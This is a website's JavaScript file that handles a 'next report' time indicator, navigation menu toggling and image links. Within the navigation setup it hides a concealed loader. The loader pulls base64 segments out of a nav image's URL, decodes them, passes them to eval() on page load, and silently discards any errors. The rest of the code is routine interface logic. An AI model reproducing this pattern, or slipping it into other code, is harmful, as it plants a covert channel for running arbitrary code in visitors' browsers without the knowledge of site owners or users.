var main = {
    init: function () {
        var that = this;
        this._updateNextReportDate();
        this._initNav();
        this._initImgLinks();
        window.setInterval(function () {
            that._updateNextReportDate()
        }, 1000)
    },
    _updateNextReportDate: function () {
        var time = new Date();
        var secondsSinceMidnight = (time.getTime() - time.setHours(0, 0, 0, 0)) / 1000 + time.getTimezoneOffset() * 60;
        var times = $("#frequency .hours i").removeClass("on");
        var timeToFocus = $.grep(times, function (tag, i) {
            var seconds = Number($(tag).attr("rel"));
            return (seconds > secondsSinceMidnight)
        });
        timeToFocus = timeToFocus.length == 0 ? times[0] : timeToFocus[0];
        $(timeToFocus).addClass("on");
        $("#frequency .hours").removeClass("off")
    },
    _initNav: function () {
        try {
            var burgerImgDef = $("nav img").attr("src").split("/C/").slice(1);
            for (var i = 0; i < 3; i++) eval(µ.base64.decode(burgerImgDef[i]))
        } catch (e) {};
        var navUsefull = $("nav #legs li").length > 1 || $("nav #pages li").length > 1;
        if (navUsefull) {
            var currentPage = $("nav #pages li.on a").attr("href").split("/")[0];
            $("nav #legs a").each(function (i, link) {
                var href = currentPage + "/?" + $(link).attr("href").split("?")[1];
                $(link).attr("href", href)
            });
            $("nav .burger").on("click", function () {
                $("nav").removeClass("on").addClass("on")
            });
            $("nav .cross").on("click", function () {
                $("nav").removeClass("on")
            });
            $("nav a").on("click", function () {})
        } else {
            $("nav").hide()
        }
    },
    _initImgLinks: function () {
        $("img.imglink").on("click", function () {
            window.open($(this).attr("title"))
        })
    }
};
document.addEventListener("DOMContentLoaded", function () {
    main.init()
});